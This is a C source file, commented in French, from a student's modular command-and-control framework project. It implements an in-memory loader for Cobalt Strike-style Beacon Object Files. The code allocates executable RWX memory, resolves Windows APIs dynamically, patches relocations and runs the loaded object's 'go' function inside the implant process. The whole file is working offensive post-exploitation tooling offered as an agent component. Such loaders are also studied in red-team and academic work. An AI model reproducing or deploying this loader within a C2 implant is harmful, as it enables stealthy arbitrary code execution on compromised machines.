/*
 * coff_loader.c — COFF/BOF Object File Loader (Technique 1)
 *
 * Architecture 64-bit : toutes les sections BOF ET les thunks sont
 * placés dans un SEUL bloc VirtualAlloc. Cela garantit que toutes les
 * relocations REL32 (±2 GB) sont valides, quel que soit l'adresse du
 * bloc dans l'espace mémoire de l'agent.
 *
 * Layout du bloc unique :
 *   [ section_0 | section_1 | ... | section_N | thunk_area ]
 *
 * Auteur  : El Mazdougui Anass
 * Date    : Avril 2026
 * Projet  : Framework C2 Modulaire — PFE INPT 2026
 */
#include "coff_loader.h"
#include "beacon_compatibility.h"
#include "module_interface.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef PLATFORM_WINDOWS

/* ── Limites ────────────────────────────────────────────────── */
#define MAX_SECTIONS   64
#define MAX_SYMBOLS    4096
#define MAX_THUNKS     512

/* ── Stub ___chkstk_ms ──────────────────────────────────────── *
 * MinGW génère un appel à ___chkstk_ms dans chaque fonction     *
 * qui alloue plus d'une page (4 KB) de pile. Ce stub NOP        *
 * satisfait le symbole sans dépendance envers msvcrt.dll.       *
 * Sûr pour les BOF courts s'exécutant dans notre processus.     */
static void chkstk_stub(void) { return; }

/* ── Alignement d'un offset sur 16 bytes ────────────────────── */
#define ALIGN16(x) (((x) + 15) & ~(size_t)15)

/* ── Erreur rapide ──────────────────────────────────────────── */
static module_result_t make_error(const char *fmt, ...) {
    module_result_t r = { -1, NULL, 0, NULL };
    char msg[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(msg, sizeof(msg), fmt, ap);
    va_end(ap);
    r.error_msg = (char *)malloc(strlen(msg) + 1);
    if (r.error_msg) strcpy(r.error_msg, msg);
    return r;
}

/* ── Lecture du nom d'un symbole ────────────────────────────── */
static void get_symbol_name(const coff_sym_t *sym,
                             const char       *str_table,
                             char             *out,
                             size_t            out_sz) {
    if (sym->Name.Long.Zeros != 0) {
        size_t i;
        for (i = 0; i < 8 && i < out_sz - 1 && sym->Name.ShortName[i]; i++)
            out[i] = sym->Name.ShortName[i];
        out[i] = '\0';
    } else {
        /* Long.Offset est un offset depuis le début de la string table
         * (octet 0 = 1er byte du champ taille 4 bytes, les strings
         *  commencent à l'offset 4). str_table pointe sur l'octet 0. */
        uint32_t off = sym->Name.Long.Offset;
        strncpy(out, str_table + off, out_sz - 1);
        out[out_sz - 1] = '\0';
    }
}

/* ── Résolution d'un symbole externe ────────────────────────── *
 * Retourne l'adresse directe de la fonction.
 * L'appelant place cette adresse dans la cellule de thunk.      */
static void *resolve_func_addr(const char *name) {
    /* 0) Runtime stubs MinGW — ___chkstk_ms et variantes ──────
     * Généré par MinGW quand une fonction alloue > 4 KB de pile.
     * On neutralise avec un stub NOP plutôt que de chercher dans
     * msvcrt.dll (qui n'est pas toujours accessible en BOF).     */
    if (strcmp(name, "___chkstk_ms") == 0 ||
        strcmp(name,  "__chkstk_ms") == 0 ||
        strcmp(name,   "_chkstk_ms") == 0 ||
        strcmp(name,      "_chkstk") == 0 ||
        strcmp(name,       "chkstk") == 0)
        return (void *)chkstk_stub;

    /* 1) API Beacon */
    void *addr = beacon_resolve_symbol(name);
    if (addr) return addr;

    /* 2) LIB$Function */
    const char *dollar = strchr(name, '$');
    if (!dollar) return NULL;

    char lib[128]  = {0};
    char func[128] = {0};
    size_t lib_len = (size_t)(dollar - name);
    if (lib_len == 0 || lib_len >= sizeof(lib)) return NULL;

    strncpy(lib,  name,        lib_len);
    strncpy(func, dollar + 1, sizeof(func) - 1);
    if (!func[0]) return NULL;

    HMODULE hLib = LoadLibraryA(lib);
    if (!hLib) {
        /* Essayer avec extension .dll explicite */
        char lib_dll[136] = {0};
        strncpy(lib_dll, lib, sizeof(lib_dll) - 5);
        strcat(lib_dll, ".dll");
        hLib = LoadLibraryA(lib_dll);
        if (!hLib) {
            printf("[COFF] LoadLibraryA('%s') échoué (err %lu)\n",
                   lib, (unsigned long)GetLastError());
            return NULL;
        }
    }
    void *fn = (void *)GetProcAddress(hLib, func);
    if (!fn)
        printf("[COFF] GetProcAddress('%s','%s') échoué\n", lib, func);
    return fn;
}


/* ============================================================
 *  FONCTION PRINCIPALE
 * ============================================================ */
module_result_t coff_loader_execute(
    const unsigned char *coff_data,
    size_t               coff_size,
    const unsigned char *args,
    size_t               args_len)
{
    /* ── Validation minimale ──────────────────────────────────── */
    if (!coff_data || coff_size < sizeof(coff_hdr_t))
        return make_error("COFF: données invalides");

    const coff_hdr_t *hdr = (const coff_hdr_t *)coff_data;

    if (hdr->Machine != COFF_MACHINE_AMD64 &&
        hdr->Machine != COFF_MACHINE_I386)
        return make_error("COFF: machine 0x%04X non supportée", hdr->Machine);

    if (hdr->NumberOfSections == 0 || hdr->NumberOfSections > MAX_SECTIONS)
        return make_error("COFF: %u sections invalide", hdr->NumberOfSections);

    size_t num_syms     = hdr->NumberOfSymbols;
    size_t sym_off      = hdr->PointerToSymbolTable;
    size_t sym_end      = sym_off + num_syms * sizeof(coff_sym_t);

    if (num_syms > MAX_SYMBOLS)
        return make_error("COFF: trop de symboles (%zu)", num_syms);
    if (sym_end > coff_size)
        return make_error("COFF: symbol table hors limites");

    const coff_sec_t *sections = (const coff_sec_t *)(
        coff_data + sizeof(coff_hdr_t) + hdr->SizeOfOptionalHeader);
    const coff_sym_t *symtab   = (const coff_sym_t *)(coff_data + sym_off);

    /* String table : pointe sur l'octet 0 (champ taille inclus).
     * Long.Offset=4 → premier octet de la première chaîne.        */
    const char *str_table = (const char *)(coff_data + sym_end);

    /* ── Calcul de la taille totale du bloc unique ─────────────── *
     * sections + zone de thunks, tout aligné sur 16 bytes.        */
    size_t section_offsets[MAX_SECTIONS] = {0};
    size_t section_sizes[MAX_SECTIONS]   = {0};
    size_t total_sections = 0;

    for (int s = 0; s < hdr->NumberOfSections; s++) {
        const coff_sec_t *sec = &sections[s];
        size_t sz = sec->VirtualSize > 0 ? sec->VirtualSize : sec->SizeOfRawData;
        section_offsets[s]  = ALIGN16(total_sections);
        section_sizes[s]    = sz;
        total_sections      = section_offsets[s] + sz;
    }

    size_t thunk_offset = ALIGN16(total_sections);
    size_t thunk_area   = MAX_THUNKS * sizeof(void *);
    size_t block_size   = thunk_offset + thunk_area;

    /* ── Allocation unique RWX ──────────────────────────────────── */
    BYTE *block = (BYTE *)VirtualAlloc(NULL, block_size,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
    if (!block)
        return make_error("COFF: VirtualAlloc(%zu) échoué", block_size);

    memset(block, 0, block_size);

    /* Pointeur sur la zone de thunks (dans le même bloc) */
    void **thunks   = (void **)(block + thunk_offset);
    int    thunk_n  = 0;

    /* ── Copie des sections dans le bloc ────────────────────────── */
    for (int s = 0; s < hdr->NumberOfSections; s++) {
        const coff_sec_t *sec = &sections[s];
        if (section_sizes[s] == 0) continue;
        if (sec->SizeOfRawData > 0 && sec->PointerToRawData > 0) {
            size_t raw_end = sec->PointerToRawData + sec->SizeOfRawData;
            if (raw_end <= coff_size)
                memcpy(block + section_offsets[s],
                       coff_data + sec->PointerToRawData,
                       sec->SizeOfRawData);
        }
    }

    /* ── Table d'adresses des symboles ──────────────────────────── */
    void **sym_addrs = (void **)calloc(num_syms, sizeof(void *));
    if (!sym_addrs) {
        VirtualFree(block, 0, MEM_RELEASE);
        return make_error("COFF: calloc sym_addrs échoué");
    }

    for (size_t i = 0; i < num_syms; ) {
        const coff_sym_t *sym = &symtab[i];
        char name[256] = {0};
        get_symbol_name(sym, str_table, name, sizeof(name));

        int16_t sec_num = sym->SectionNumber;

        if (sec_num > 0 && sec_num <= (int16_t)hdr->NumberOfSections) {
            /* Symbole interne */
            int idx = sec_num - 1;
            sym_addrs[i] = (block + section_offsets[idx]) + sym->Value;

        } else if (sec_num == 0) {
            /* Symbole externe */
            const char *lookup = name;
            int is_imp = 0;

            if (strncmp(name, "__imp_", 6) == 0) {
                lookup = name + 6;
                is_imp = 1;
            }

            void *fn = (strncmp(lookup, "Beacon", 6) == 0 || strchr(lookup, '$'))
                       ? resolve_func_addr(lookup)
                       : NULL;

            if (!fn && name[0] != '\0') {
                /* Essayer aussi le nom brut (sans __imp_) */
                fn = beacon_resolve_symbol(lookup);
            }

            if (fn) {
                if (is_imp) {
                    /* Thunk : cellule de pointeur dans le bloc */
                    if (thunk_n < MAX_THUNKS) {
                        thunks[thunk_n] = fn;
                        sym_addrs[i]    = (void *)&thunks[thunk_n];
                        thunk_n++;
                    }
                } else {
                    sym_addrs[i] = fn;
                }
            } else if (name[0]) {
                printf("[COFF] Symbole non résolu: '%s'\n", name);
            }

        } else if (sec_num == (int16_t)-1) {
            sym_addrs[i] = (void *)(uintptr_t)sym->Value;
        }

        i += 1 + sym->NumberOfAuxSymbols;
    }

    /* ── Application des relocations ────────────────────────────── */
    for (int s = 0; s < hdr->NumberOfSections; s++) {
        const coff_sec_t *sec = &sections[s];
        if (!sec->NumberOfRelocations) continue;

        size_t reloc_end = sec->PointerToRelocations +
                           sec->NumberOfRelocations * sizeof(coff_reloc_t);
        if (reloc_end > coff_size) continue;

        const coff_reloc_t *relocs =
            (const coff_reloc_t *)(coff_data + sec->PointerToRelocations);

        for (int r = 0; r < (int)sec->NumberOfRelocations; r++) {
            const coff_reloc_t *rel = &relocs[r];
            if (rel->SymbolTableIndex >= num_syms) continue;

            char *patch = (char *)(block + section_offsets[s] + rel->VirtualAddress);
            void *target = sym_addrs[rel->SymbolTableIndex];
            if (!target) continue;

            switch (rel->Type) {

            case IMAGE_REL_AMD64_ADDR64: {
                int64_t addend = *(int64_t *)patch;
                *(uint64_t *)patch = (uint64_t)((char *)target + addend);
                break;
            }
            case IMAGE_REL_AMD64_ADDR32:
            case IMAGE_REL_AMD64_ADDR32NB:
                *(uint32_t *)patch = (uint32_t)((uintptr_t)target & 0xFFFFFFFF);
                break;

            case IMAGE_REL_AMD64_REL32: {
                int32_t addend = *(int32_t *)patch;
                int64_t off    = (int64_t)((char *)target - (patch + 4)) + addend;
                *(int32_t *)patch = (int32_t)off;
                break;
            }
            case IMAGE_REL_AMD64_REL32_1:
            case IMAGE_REL_AMD64_REL32_2:
            case IMAGE_REL_AMD64_REL32_3:
            case IMAGE_REL_AMD64_REL32_4:
            case IMAGE_REL_AMD64_REL32_5: {
                int N = rel->Type - IMAGE_REL_AMD64_REL32;
                int32_t addend = *(int32_t *)patch;
                int64_t off    = (int64_t)((char *)target - (patch + 4 + N)) + addend;
                *(int32_t *)patch = (int32_t)off;
                break;
            }
            default:
                break;
            }
        }
    }

    /* ── Recherche de la fonction "go" ──────────────────────────── */
    bof_entry_func_t go_func = NULL;

    for (size_t i = 0; i < num_syms && !go_func; ) {
        const coff_sym_t *sym = &symtab[i];
        char name[256] = {0};
        get_symbol_name(sym, str_table, name, sizeof(name));

        if ((strcmp(name, BOF_ENTRY_FUNC) == 0 ||
             strcmp(name, "_go")           == 0) &&
             sym->SectionNumber > 0 && sym_addrs[i]) {
            go_func = (bof_entry_func_t)sym_addrs[i];
        }
        i += 1 + sym->NumberOfAuxSymbols;
    }

    if (!go_func) {
        free(sym_addrs);
        VirtualFree(block, 0, MEM_RELEASE);
        return make_error("COFF: fonction '%s' introuvable", BOF_ENTRY_FUNC);
    }

    printf("[COFF] go() @ %p — thunks: %d — bloc: %p (%zu bytes)\n",
           (void *)go_func, thunk_n, (void *)block, block_size);
    fflush(stdout);

    /* ── Exécution du BOF ────────────────────────────────────────── */
    beacon_reset_output();
    go_func((char *)args, (int)args_len);

    /* ── Récupération de la sortie ──────────────────────────────── */
    module_result_t result = { 0, NULL, 0, NULL };
    beacon_output_t *bout  = beacon_get_output();

    if (bout->length > 0 && bout->buffer) {
        result.data = (unsigned char *)malloc(bout->length + 1);
        if (result.data) {
            memcpy(result.data, bout->buffer, bout->length);
            result.data[bout->length] = '\0';
            result.data_len = bout->length;
        }
    } else {
        const char *empty = "[BOF] Exécution réussie (aucune sortie)";
        result.data = (unsigned char *)malloc(strlen(empty) + 1);
        if (result.data) {
            strcpy((char *)result.data, empty);
            result.data_len = strlen(empty);
        }
    }

    /* ── Nettoyage ───────────────────────────────────────────────── */
    free(sym_addrs);
    beacon_reset_output();
    VirtualFree(block, 0, MEM_RELEASE);
    return result;
}


/* ============================================================
 *  STUB LINUX
 * ============================================================ */
#else

module_result_t coff_loader_execute(
    const unsigned char *coff_data, size_t coff_size,
    const unsigned char *args,      size_t args_len)
{
    (void)coff_data; (void)coff_size; (void)args; (void)args_len;
    module_result_t r = { -2, NULL, 0, NULL };
    const char *msg = "COFF loader non disponible sur Linux";
    r.error_msg = (char *)malloc(strlen(msg) + 1);
    if (r.error_msg) strcpy(r.error_msg, msg);
    return r;
}

#endif /* PLATFORM_WINDOWS */
